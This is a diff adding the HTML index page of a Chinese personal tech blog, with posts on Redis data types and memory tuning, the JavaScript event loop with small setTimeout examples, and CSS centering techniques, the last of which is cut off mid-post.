@@ -1,0 +1,770 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>colorfulcow</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="colorfulcow">
+    
+
+    
+    <meta property="og:type" content="website">
+<meta property="og:title" content="colorfulcow">
+<meta property="og:url" content="https://colorfulcow.github.io/index.html">
+<meta property="og:site_name" content="colorfulcow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="colorfulcow">
+
+    
+    <link rel="alternative" href="/atom.xml" title="colorfulcow" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="colorfulcow" title="colorfulcow"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="colorfulcow">colorfulcow</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:colorfulcow.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main">
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/02/07/Redis常用数据类型存储与优化/" title="Redis常用数据类型存储与优化" itemprop="url">Redis常用数据类型存储与优化</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="colorfulcow" target="_blank" itemprop="author">colorfulcow</a>
+		
+  <p class="article-time">
+    <time datetime="2017-02-07T02:34:34.000Z" itemprop="datePublished"> Published 2017-02-07</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h4 id="Redis常用的数据类型"><a href="#Redis常用的数据类型" class="headerlink" title="Redis常用的数据类型"></a>Redis常用的数据类型</h4><p>Redis 最为常用的数据类型主要有以下五种：</p>
+<p>• String<br>• Hash<br>• List<br>• Set<br>• Sorted set</p>
+<p>在具体描述这几种数据类型之前，我们先通过一张图了解下 Redis 内部内存管理中是如何描述这些不同数据类型的：</p>
+<p><img src="../../../../img/redis_core.png" alt="Alt text"></p>
+<p>Redis 内部使用一个 redisObject 对象来表示所有的 key 和 value，redisObject 最主要的信息如上图所示；type  代表一个 value 对象具体是何种数据类型，encoding 是不同数据类型在 redis 内部的存储方式，比如：type=string 代表 value 存储的是一个普通字符串，那么对应的 encoding 可以是 raw 或者是 int，如果是 int 则代表实际 redis 内部是按数值型类存储和表示这个字符串的，当然前提是这个字符串本身可以用数值表示，比如：”123″ “456”这样的字符串;</p>
+<h4 id="五种数据类型的使用和内部实现方式"><a href="#五种数据类型的使用和内部实现方式" class="headerlink" title="五种数据类型的使用和内部实现方式"></a>五种数据类型的使用和内部实现方式</h4><h5 id="String"><a href="#String" class="headerlink" title="String"></a>String</h5><p>常用命令：<br>set,get,decr,incr,mget 等</p>
+<p>应用场景:<br>String 是最常用的一种数据类型，普通的 key/value 存储都可以归为此类;</p>
+<p>实现方式：<br>String 在 redis 内部存储默认就是一个字符串，被 redisObject 所引用，当遇到 incr,decr 等操作时会转成数值型进行计算，此时 redisObject 的 encoding 字段为int。</p>
+<h5 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h5><p>常用命令:<br>hget,hset,hgetall 等</p>
+<p>应用场景:<br>简单举个实例来描述下 Hash 的应用场景，比如我们要存储一个用户信息对象数据，包含以下信息： 用户 ID 为查找的 key，存储的 value 用户对象包含姓名，年龄，生日等信息，如果用普通的 key/value 结构来存储，主要有以下2种存储方式：<br><img src="../../../../img/redis_key_value.png" alt="Alt text"></p>
+<p>第一种方式将用户 ID 作为查找 key，把其他信息封装成一个对象以序列化的方式存储，这种方式的缺点是，增加了序列化/反序列化的开销，并且在需要修改其中一项信息时，需要把整个对象取回，并且修改操作需要对并发进行保护，引入CAS等复杂问题。<br>在实际的项目中就是用了这种方式来缓存用户信息。</p>
+<p>第二种方法是这个用户信息对象有多少成员就存成多少个 key-value 对儿，用用户 ID +对应属性的名称作为唯一标识来取得对应属性的值，虽然省去了序列化开销和并发问题，但是用户 ID 为重复存储，如果存在大量这样的数据，内存浪费很大。</p>
+<p>那么 Redis 提供的 Hash 很好的解决了这个问题，Redis 的 Hash 实际是内部存储的 Value 为一个 HashMap，并提供了直接存取这个 Map 成员的接口，如下图：</p>
+<p><img src="../../../../img/redis_hash.png" alt="Alt text"></p>
+<p>也就是说，Key 仍然是用户 ID，value 是一个 Map，这个 Map 的 key 是成员的属性名，value 是属性值，这样对数据的修改和存取都可以直接通过其内部 Map 的 Key（Redis 里称内部 Map 的 key 为 field），也就是通过 key（用户 ID） + field（属性标签）就可以操作对应属性数据了，既不需要重复存储数据，也不会带来序列化和并发修改控制的问题。很好的解决了问题。</p>
+<p>这里同时需要注意，Redis 提供了接口（hgetall）可以直接取到全部的属性数据，但是如果内部 Map 的成员很多，那么涉及到遍历整个内部 Map 的操作，由于 Redis 单线程模型的缘故，这个遍历操作可能会比较耗时，而让其它客户端的请求完全不响应，这点需要格外注意；</p>
+<p>实现方式:</p>
+<p>上面已经说到 Redis Hash 对应 Value 内部实际就是一个 HashMap，实际这里会有2种不同实现，这个 Hash 的成员比较少时 Redis 为了节省内存会采用类似一维数组的方式来紧凑存储，而不会采用真正的 HashMap 结构，对应的 value redisObject 的 encoding 为 zipmap，当成员数量增大时会自动转成真正的 HashMap，此时 encoding 为 ht。</p>
+<h5 id="List"><a href="#List" class="headerlink" title="List"></a>List</h5><p>常用命令:<br>lpush,rpush,lpop,rpop,lrange等。</p>
+<p>应用场景:<br>Redis list 的应用场景非常多，也是 Redis 最重要的数据结构之一；</p>
+<p>实现方式:<br>Redis list 的实现为一个双向链表，即可以支持反向查找和遍历，更方便操作，不过带来了部分额外的内存开销，Redis 内部的很多实现，包括发送缓冲队列等也都是用的这个数据结构。</p>
+<h5 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h5><p>常用命令:<br>sadd,spop,smembers,sunion 等。</p>
+<p>应用场景:<br>Redis set 对外提供的功能与 list 类似是一个列表的功能，特殊之处在于 set 是可以自动排重的，当你需要存储一个列表数据，又不希望出现重复数据时，set 是一个很好的选择，并且 set 提供了判断某个成员是否在一个 set 集合内的重要接口，这个也是 list 所不能提供的。</p>
+<p>实现方式:<br>set 的内部实现是一个 value 永远为 null 的 HashMap，实际就是通过计算 hash 的方式来快速排重的，这也是 set 能提供判断一个成员是否在集合内的原因。</p>
+<h5 id="Sorted-set"><a href="#Sorted-set" class="headerlink" title="Sorted set"></a>Sorted set</h5><p>常用命令:<br>zadd,zrange,zrem,zcard等</p>
+<p>应用场景:<br>Redis sorted set 的使用场景与 set 类似，区别是 set 不是自动有序的，而 sorted set 可以通过用户额外提供一个优先级（score）的参数来为成员排序，并且是插入有序的，即自动排序。当你需要一个有序的并且不重复的集合列表，那么可以选择 sorted set 数据结构，比如 twitter 的 public timeline 可以以发表时间作为 score 来存储，这样获取时就是自动按时间排好序的。</p>
+<p>实现方式:<br>Redis sorted set 的内部使用 HashMap 和跳跃表（SkipList）来保证数据的存储和有序，HashMap 里放的是成员到 score 的映射，而跳跃表里存放的是所有的成员，排序依据是 HashMap 里存的 score，使用跳跃表的结构可以获得比较高的查找效率，并且在实现上比较简单</p>
+<h4 id="常用内存优化手段"><a href="#常用内存优化手段" class="headerlink" title="常用内存优化手段"></a>常用内存优化手段</h4><ul>
+<li><p>最重要的一点是不要开启 Redis 的 VM 选项，即虚拟内存功能，这个本来是作为 Redis 存储超出物理内存数据的一种数据在内存与磁盘换入换出的一个持久化策略，但是其内存管理成本也非常的高，并且此种持久化策略并不成熟。</p>
+</li>
+<li><p>最好设置下 redis.conf 中的 maxmemory 选项，该选项是告诉 Redis 当使用了多少物理内存后就开始拒绝后续的写入请求，该参数能很好的保护好你的 Redis 不会因为使用了过多的物理内存而导致 swap，最终严重影响性能甚至崩溃</p>
+</li>
+<li><p>Redis 为不同数据类型分别提供了一组参数来控制内存使用，我们在前面详细分析过 Redis Hash 是 value 内部为一个 HashMap，如果该 Map 的成员数比较少，则会采用类似一维线性的紧凑格式来存储该 Map，即省去了大量指针的内存开销，这个参数控制对应在 redis.conf 配置文件中下面2项：</p>
+</li>
+</ul>
+<blockquote>
+<p>hash-max-zipmap-entries 64<br>hash-max-zipmap-value 512<br>hash-max-zipmap-entries</p>
+</blockquote>
+<p>含义是当 value 这个 Map 内部不超过多少个成员时会采用线性紧凑格式存储，默认是64，即 value 内部有64个以下的成员就是使用线性紧凑存储，超过该值自动转成真正的 HashMap。</p>
+<p>hash-max-zipmap-value 含义是当 value 这个 Map 内部的每个成员值长度不超过多少字节就会采用线性紧凑存储来节省空间。</p>
+<p>以上2个条件任意一个条件超过设置值都会转换成真正的 HashMap，也就不会再节省内存了，那么这个值是不是设置的越大越好呢，答案当然是否定的，HashMap 的优势就是查找和操作的时间复杂度都是 O(1) 的，而放弃 Hash 采用一维存储则是 O(n) 的时间复杂度，如果成员数量很少，则影响不大，否则会严重影响性能，所以要权衡好这个值的设置，总体上还是最根本的时间成本和空间成本上的权衡。</p>
+<p>同样类似的参数还有：</p>
+<blockquote>
+<p>list-max-ziplist-entries 512</p>
+</blockquote>
+<p>说明：list 数据类型多少节点以下会采用去指针的紧凑存储格式。</p>
+<blockquote>
+<p>list-max-ziplist-value 64</p>
+</blockquote>
+<p>说明：list 数据类型节点值大小小于多少字节会采用紧凑存储格式。</p>
+<blockquote>
+<p>set-max-intset-entries 512</p>
+</blockquote>
+<p>说明：set 数据类型内部数据如果全部是数值型，且包含多少节点以下会采用紧凑格式存储。</p>
+<p>最后 Redis 内部实现没有对内存分配方面做过多的优化，在一定程度上会存在内存碎片，不过大多数情况下这个不会成为 Redis 的性能瓶 颈，不过如果在 Redis 内部存储的大部分数据是数值型的话，Redis 内部采用了一个 shared integer 的方式来省去分配内存的开销，即在系统启动时先分配一个从 1~n 那么多个数值对象放在一个池子中，如果存储的数据恰好是这个数值范围内的数据，则直接从池子里取出该对象，并且通过引用计数的方式来共享，这样在系统存储了大量数值下，也能一定程度上节省内存并且提高性能，这个参数值 n 的设置需要修改源代码中的一行宏定义 REDIS_SHARED_INTEGERS，该值 默认是 10000，可以根据自己的需要进行修改，修改后重新编译就可以。</p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/redis/">redis</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/redis/">redis</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/2017/02/07/Redis常用数据类型存储与优化/#disqus_thread" class="comments-count-link">Comments</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/01/01/有关javascript事件模型的一点总结/" title="有关javascript事件模型的一点总结" itemprop="url">有关javascript事件模型的一点总结</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="colorfulcow" target="_blank" itemprop="author">colorfulcow</a>
+		
+  <p class="article-time">
+    <time datetime="2017-01-01T15:22:45.000Z" itemprop="datePublished"> Published 2017-01-01</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h3 id="有关javascript事件模型的一点总结"><a href="#有关javascript事件模型的一点总结" class="headerlink" title="有关javascript事件模型的一点总结"></a>有关javascript事件模型的一点总结</h3><p>在谈论javascript的事件模型之前，我们在学习javascript的时候可能都听到过一下这些东西：javascript是单线程的，javascript是异步的等等…</p>
+<p>这时候可能会想既然javascript是单线程的那么javascript又哪来的异步特性？javascript既然是单线程语言 ， 为什么会分主线程和消息线程？</p>
+<p>要解答以上问题，我们需要弄清楚几个概念</p>
+<ul>
+<li>ECMAscript</li>
+<li>javascript</li>
+<li>javascript执行环境</li>
+</ul>
+<p>ECMAscript是javascript的语言标准，ECMAscript并没有从语言层面上规定javascript的异步特性；<br>javascript是ECMAscript规范的一种实现，是单线程的;<br>javascript运行环境是浏览器或者node；</p>
+<p>首先解释javascript的异步特性：<br>javascript是单线程的，但是javascript的执行环境并不是单线程的；<br>但凡这种「既是单线程又是异步」的语言有一个共同特点：它们是 event-driven 的。驱动它们的 event 来自一个异构的平台。这些语言的 top-level 不象 C 那样是 main，而是一组 event-handler。虽然所有 event-handler 都在同一个线程内执行，但是它们被调用的时机是由那个驱动平台决定的。而且设计要求每个 event-handler 要尽快结束。未做完的工作可以通知那个异构的驱动平台来完成。所以那个驱动平台可以有许多线程。<br>恰好，浏览器就是这种 event-driven 架构的软件,nodejs也是这样的javascript运行环境、我们所探讨的“异步”都是由执行引擎所赋予的。于Firefox，这个引擎是SpiderMonkey，于Node.js这个引擎是V8。而提供这个异步能力的机制，则是我们所谓的Event Loop——事件轮询。</p>
+<p>在浏览器端，浏览器使用 Event Loop 来协调 DOM 事件、UI 渲染、脚本执行和网络事件等。整个协调的过程都是通过 Event Loop 来控制的。每当 DOM 事件、计时器事件或者网络事件被触发时，它们的回调函数和 Context 都会被压入 Event Queue，而 Event Loop 则会从中取出回调函数并执行。</p>
+<p>在Node端，Node采用V8作为JavaScript的执行引擎，同时使用libuv实现事件驱动式异步I/O。其事件循环就是采用了libuv的默认事件循环。</p>
+<p>所以像setTimeout，setInterval这样的函数，实际上并不是由语言本身所约定的，而是浏览器/执行引擎来实现，向JavaScript暴露的、提供的异步入口。<br>因此，异步与单线程并没有出现矛盾。而具体到浏览器端，每个跃然于我们屏幕之前的Tab页，都拥有一个JS执行线程，即<br>There is only one JavaScript thread per window.页面上虽然只提供了一个JavaScript Call Stack用于执行代码，不过浏览器在内部还实现了一个或多个队列，借由事件轮询的机制来调度全部事件的处理，而且在一定程度上，陈旭编写者有权进入到这个内部的轮询中。其一，可以是Timer函数，其二，则可以是通过事件。</p>
+<h4 id="javascript的事件模型"><a href="#javascript的事件模型" class="headerlink" title="javascript的事件模型"></a>javascript的事件模型</h4><hr>
+<p>copy一下javascript的事件模型在mdn上的定义：<br>javascript有一个基于事件驱动的并发模型；</p>
+<p>运行环境的概念：<br>接下来的章节解释了一个理论模型，现代javascript引擎大量实现和优化了以下描述的语义：</p>
+<p>视觉表示：<img src="../../../../img/fuccc.svg" alt=""></p>
+<h6 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h6><p>函数的调用会形成一个调用栈<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">b</span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> a = <span class="number">12</span>;</div><div class="line">  <span class="keyword">return</span> a+b+<span class="number">35</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params">x</span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> m = <span class="number">4</span>;</div><div class="line">  <span class="keyword">return</span> f(m*x);</div><div class="line">&#125;</div><div class="line"></div><div class="line">g(<span class="number">21</span>);</div></pre></td></tr></table></figure></p>
+<p>当调用g的时候创建第一个调用栈包含了g的参数和局部变量；当g调用f的时候第二个调用栈被创建包含了f的参数和局部变量并且被推入栈顶部；<br>当f函数返回的时候栈顶的元素被推出栈，这样栈里面就只有g一个调用栈，当g返回的时候，栈就空了；</p>
+<h6 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h6><p>对象被分配在堆中,  通过一个对象名，表示一个非结构化的内存区域;</p>
+<h6 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h6><p>一个javascript的运行环境包含了一个消息队列，是一个等待被执行的消息列表，每个消息都会关联一个函数方法，当函数调用栈中有充足的容量的时候，消息就会从消息队列中取出并执行(When the stack has enough capacity, a message is taken out of the queue and processed. mdn上是这样描述的，我理解这个stack表示的应该就是函数的运行空间)。当栈变空之后表示消息执行结束。</p>
+<h6 id="事件轮询"><a href="#事件轮询" class="headerlink" title="事件轮询"></a>事件轮询</h6><p>事件轮询之所以叫做事件轮询是因为它的实现方式，通常实现是类似于下面的代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span>(queue.waitForMessage())&#123;</div><div class="line">  queue.processNextMessage();</div><div class="line">&#125;</div><div class="line"><span class="comment">//当没有消息的时候queue.waitForMessage会等待同步消息的到达</span></div></pre></td></tr></table></figure></p>
+<h6 id="消息的执行特点"><a href="#消息的执行特点" class="headerlink" title="消息的执行特点"></a>消息的执行特点</h6><p>在当前的消息a被执行之前，a的前一个消息b一定是被执行完全才会执行a；这提供了一些不错的特性，比如当一个函数f在运行的时候，其他的函数不可能在f执行完之前被执行，也就是说其他函数在f执行完之前不可能有机会去修改f函数中正在处理的数据；</p>
+<p>这种事件模型有一个缺点，比如在浏览器中，当一个消息的执行时间过长的话，那么应用程序就不会去处理其他的用户交互比如点击或者滚动,比较好的处理方式就是减少一个消息的处理时间，如果可能的话可以把一个比较长的消息分解为几个零碎的消息；</p>
+<h6 id="往队列中添加消息"><a href="#往队列中添加消息" class="headerlink" title="往队列中添加消息"></a>往队列中添加消息</h6><p>在浏览器中，消息是在事件发生时添加的，并且附加了事件侦听器，如果没有侦听器，事件将会丢失。因此，点击具有点击事件处理程序的元素将会往消息队列中添加一条消息 - 与任何其他事件如滚动事件等一样。调用setTimeout后会在经过settimeout方法第二个参数所标识的时间之后将消息添加到队列中，如果队列中没有其他消息那么这条消息刚好会被处理，然而如果队列中有消息，那么settimeout添加到队列中的消息将必须等待其他消息被处理完成后才会被处理，因为这个原因，settimeout的第二个参数仅仅代表settimeout中的方法被执行的最小时间，而不是准确的执行时间;</p>
+<h6 id="零延迟"><a href="#零延迟" class="headerlink" title="零延迟"></a>零延迟</h6><p>零延迟并不是真正代表着回调会被立即执行，比如调用setTimeout(functionA, 0)的时候,在给定的时间间隔后并不会执行回调函数，functionA的执行时间会受到事件队列中的任务的影响，0同样也是funcationA被调用的最小时延</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line"></div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'this is the start'</span>);</div><div class="line"></div><div class="line">  setTimeout(<span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'this is a msg from call back'</span>);</div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'this is just a message'</span>);</div><div class="line"></div><div class="line">  setTimeout(<span class="function"><span class="keyword">function</span> <span class="title">cb1</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'this is a msg from call back1'</span>);</div><div class="line">  &#125;, <span class="number">0</span>);</div><div class="line"></div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'this is the end'</span>);</div><div class="line"></div><div class="line">&#125;)();</div><div class="line"></div><div class="line"><span class="comment">// "this is the start"</span></div><div class="line"><span class="comment">// "this is just a message"</span></div><div class="line"><span class="comment">// "this is the end"</span></div><div class="line"><span class="comment">// "this is a msg from call back"</span></div><div class="line"><span class="comment">// "this is a msg from call back1"</span></div></pre></td></tr></table></figure>
+<h6 id="多个运行环境之间的通信"><a href="#多个运行环境之间的通信" class="headerlink" title="多个运行环境之间的通信"></a>多个运行环境之间的通信</h6><p>一个web worker或者一个cross-origin 的iframe都会有自己的执行堆栈和消息队列，不同的运行环境之间的通信只能通过<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank" rel="external">postMessage</a>方法</p>
+<h6 id="非阻塞"><a href="#非阻塞" class="headerlink" title="非阻塞"></a>非阻塞</h6><p>非阻塞是一个很有趣的javascript事件轮询的特性,处理i/o操作通常是通过事件和回调方法，例如应用程序在等待XHR的返回的时候还可以继续处理其他事件比如用户输入等；</p>
+<hr>
+<p>根据mdn中关于javascript事件模型的描述，消息队列就是我们平常说的事件队列，消息就是事件</p>
+<h5 id="浏览器端"><a href="#浏览器端" class="headerlink" title="浏览器端"></a>浏览器端</h5><p>DOM事件的接口中有同步事件与异步事件的区别。<br>DOM的同步方法，比方说DOM.setAttribute，DOM.style等等，顾名思义，它们都会在当前JS的执行线程同步执行，也因此我们在使用这些方法，有时候会带来重排重绘的副作用。<br>而异步事件，比如DOM.addEventListener，则会将函数以类似”委托”的形式注册到浏览器内建的队列中，等到某个”事件”被触发后，则回Call之前注册的函数。流程类似下图所示：<br> <img src="../../../../img/browser_eventloop.jpg" alt=""></p>
+<p>按图中所示，用户的Click事件会经历完整的1-&gt;2-&gt;3-&gt;4-&gt;5的生命周期，而假设当我们的事件正处于在Stage：5的状态做密集执行，与此同时又触发了别的事件，e.g. Timer 或者Interval，则后续的事件将会持续Pending在Event Queue中，直到Click的回调中所有同步代码执行完毕，Event Loop选取下一个在队列顶部的任务，再次执行。</p>
+<h5 id="nodejs端异步任务的执行流程"><a href="#nodejs端异步任务的执行流程" class="headerlink" title="nodejs端异步任务的执行流程"></a>nodejs端异步任务的执行流程</h5><p> <img src="../../../../img/node_async.jpg" alt=""></p>
+<h5 id="ref"><a href="#ref" class="headerlink" title="ref:"></a>ref:</h5><p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop" target="_blank" rel="external">MDN - Concurrency model and Event Loop</a></p>
+<p><a href="http://docs.libuv.org/en/v1.x/design.html" target="_blank" rel="external">libuv Design Overview</a></p>
+<p><a href="https://nodejs.org/api/child_process.html#child_process_event_exit" target="_blank" rel="external">node child_process ‘exit’</a></p>
+<p><a href="http://blog.trevnorris.com/2013/07/node-with-threads.html" target="_blank" rel="external">Node with threads</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/javascript基础/">javascript基础</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/javascript/">javascript</a><a href="/tags/nodejs/">nodejs</a>
+  </div>
+
+</div>
+
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/2017/01/01/有关javascript事件模型的一点总结/#disqus_thread" class="comments-count-link">Comments</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2016/03/07/通过css实现各种居中效果/" title="通过css实现各种居中效果" itemprop="url">通过css实现各种居中效果</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="colorfulcow" target="_blank" itemprop="author">colorfulcow</a>
+		
+  <p class="article-time">
+    <time datetime="2016-03-07T10:42:04.000Z" itemprop="datePublished"> Published 2016-03-07</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <p>在平时写CSS过程中，经常遇到需要实现各种居中布局的效果，包括水平居中，垂直居中，垂直水平居中，多行文本，块元素的水平垂直居中等，这里总结一下各种居中的实现方法，以便在工作中可以直接使用。</p>
+<h3 id="水平居中"><a href="#水平居中" class="headerlink" title="水平居中"></a>水平居中</h3><blockquote>
+<h4 id="1-行内元素的水平居中"><a href="#1-行内元素的水平居中" class="headerlink" title="1.行内元素的水平居中"></a>1.行内元素的水平居中</h4></blockquote>
+<p>将块级容器元素设置为<code>text-align:center;</code></p>
+<blockquote>
+<h4 id="2-单个块元素的水平居中，"><a href="#2-单个块元素的水平居中，" class="headerlink" title="2.单个块元素的水平居中，"></a>2.单个块元素的水平居中，</h4></blockquote>
+<h5 id="在块元素设置了适当宽度的情况下，设置-margin-left-和-margin-right-为-auto"><a href="#在块元素设置了适当宽度的情况下，设置-margin-left-和-margin-right-为-auto" class="headerlink" title="在块元素设置了适当宽度的情况下，设置 margin-left 和 margin-right 为 auto"></a>在块元素设置了适当宽度的情况下，设置 margin-left 和 margin-right 为 auto</h5><p>是使用的过程中直接用margin:0 auto可以让块元素水平居中，那么为什么这么设置就可以达到水平居中的效果？为什么margin: auto * ;无法实现垂直居中的效果？</p>
+<p>因为在css规范可视化布局中，块级元素在普通流内布局有公式描述’margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘width’ + ‘padding-right’ + ‘border-right-width’ + ‘margin-right’ = width of containing block<br>根据规范，margin-top: auto; 和 margin-bottom: auto;，其计算值为0；<br>如果 ‘margin-left’ ‘margin-right’ 都是 auto 值，keyword auto默认是使用剩余空间,所以子元素会均分剩余空间。</p>
+<blockquote>
+<h4 id="3-多个块元素的水平居中"><a href="#3-多个块元素的水平居中" class="headerlink" title="3.多个块元素的水平居中"></a>3.多个块元素的水平居中</h4></blockquote>
+<h5 id="修改子级块元素的-display-值为inline-block-容器元素的text-align值为center"><a href="#修改子级块元素的-display-值为inline-block-容器元素的text-align值为center" class="headerlink" title="修改子级块元素的 display 值为inline-block,容器元素的text-align值为center"></a>修改子级块元素的 display 值为inline-block,容器元素的text-align值为center</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.main</span>&#123;</div><div class="line">    <span class="attribute">width</span>:<span class="number">100%</span>;</div><div class="line">    <span class="attribute">height</span>:<span class="number">300px</span>;</div><div class="line">    <span class="attribute">background-color</span>: <span class="number">#4dbea0</span>;</div><div class="line">    <span class="attribute">text-align</span>: center;</div><div class="line">  &#125;</div><div class="line">  <span class="selector-class">.main</span>&gt;<span class="selector-tag">div</span>&#123;</div><div class="line">    <span class="attribute">height</span>:<span class="number">100px</span>;</div><div class="line">    <span class="attribute">width</span>:<span class="number">100px</span>;</div><div class="line">    <span class="attribute">margin</span>:<span class="number">0</span> <span class="number">20px</span>;</div><div class="line">    <span class="attribute">background-color</span>: <span class="number">#db6172</span>;</div><div class="line">    <span class="attribute">display</span>: inline-block;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
+<figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;div class="main"&gt;</div><div class="line">   &lt;div&gt;1&lt;/div&gt;</div><div class="line">   &lt;div&gt;2&lt;/div&gt;</div><div class="line">   &lt;div&gt;3&lt;/div&gt;</div><div class="line">   &lt;div&gt;4&lt;/div&gt;</div><div class="line"> &lt;/div&gt;</div></pre></td></tr></table></figure>
+<p>通过flex-box实现,不需要修改子元素的display属性，将容器div设置为<code>display:flex;justify-content:center;</code>,需要考虑浏览器的兼容性问题  <a href="http://caniuse.com/#search=flex" target="_blank" rel="external">can i use</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.main&#123;</div><div class="line">    width:100%;</div><div class="line">    height:300px;</div><div class="line">    background-color: #4dbea0;</div><div class="line">    display: flex;</div><div class="line">    justify-content: center;//水平居中</div><div class="line">  &#125;</div><div class="line">  .main&gt;div&#123;</div><div class="line">    height:100px;</div><div class="line">    width:100px;</div><div class="line">    margin:0 20px;</div><div class="line">    background-color: #db6172;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
